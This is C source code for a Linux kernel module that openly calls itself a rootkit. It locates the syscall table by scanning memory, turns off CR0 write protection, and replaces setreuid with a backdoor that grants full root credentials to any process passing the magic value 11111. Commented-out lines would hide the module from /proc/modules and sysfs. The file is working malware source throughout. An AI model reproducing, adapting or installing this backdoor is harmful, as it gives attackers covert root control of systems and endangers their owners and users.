//some of the code has been plagiarized by Ian Roi Talla

#include <linux/module.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/kobject.h>
#include <linux/unistd.h>
#include <linux/syscalls.h>
#include <linux/string.h>
#include <linux/slab.h>
#include <linux/fdtable.h>
#include <linux/fs.h>
#include <asm/uaccess.h>
#include <asm/unistd.h>
#include <linux/cred.h>

#include <linux/kobject.h>
#include <linux/string.h>
#include <linux/types.h>
#include <linux/stat.h>
#include <linux/fcntl.h>
#include <linux/file.h>

#include <linux/version.h>

// check whether system is 32-bit or 64-bit to assign appropriate pointer size
#if defined(__i386__)
#define START_CHECK 0xc0000000
#define END_CHECK 0xd0000000
typedef unsigned int psize;
#else
#define START_CHECK 0xffffffff81000000
#define END_CHECK 0xffffffffa2000000
typedef unsigned long psize;
#endif

psize *sys_call_table;

asmlinkage long (*o_setreuid) (uid_t ruid, uid_t reuid);

asmlinkage long backdoor_setreuid(uid_t r, uid_t e) {
	uid_t secret = 11111;
	if(r == secret && e == secret) {
		struct cred *credentials = prepare_creds();
		credentials->uid = credentials->gid = 0;
        credentials->suid = credentials->sgid = 0;
        credentials->euid = credentials->egid = 0;
        credentials->fsuid = credentials->fsgid = 0;

        return commit_creds(credentials);
	} else {
		return (*o_setreuid) (r, e);
	}


}

psize **find(void) {

	psize **sctable;
	psize i = START_CHECK;

	while (i < END_CHECK) {

		sctable = (psize **) i;
		if (sctable[__NR_close] == (psize *) sys_close) return &sctable[0];
		i += sizeof(void *);
	}
	return NULL;
}

void add_setreuid(void) {

	write_cr0(read_cr0() & (~ 0x10000));
	o_setreuid = (void*) xchg(&sys_call_table[__NR_setreuid32], backdoor_setreuid);
	write_cr0(read_cr0() | 0x10000);
}

void remove_setreuid(void) {

	write_cr0(read_cr0() & (~ 0x10000));
	xchg(&sys_call_table[__NR_setreuid32], o_setreuid);
	write_cr0(read_cr0() | 0x10000);
}

// ==========================
// load and unload the module
// ==========================

int init_module(void) {
    if((sys_call_table = (psize *) find())) {
		printk("sys_call_table found at %p\n", sys_call_table);
	} else {
		printk(KERN_ERR "syscall table not found; aborting\n");
		return 1;
	}

	//hide module from /proc/modules and /sys/module respectively
	//list_del_init(&__this_module.list);
	//kobject_del(&THIS_MODULE->mkobj.kobj);

	add_setreuid();

	printk(KERN_INFO "rootkit loaded\n");
	return 0;
}

void cleanup_module(void) {

	remove_setreuid();

	printk(KERN_INFO "rootkit unloaded\n");
}
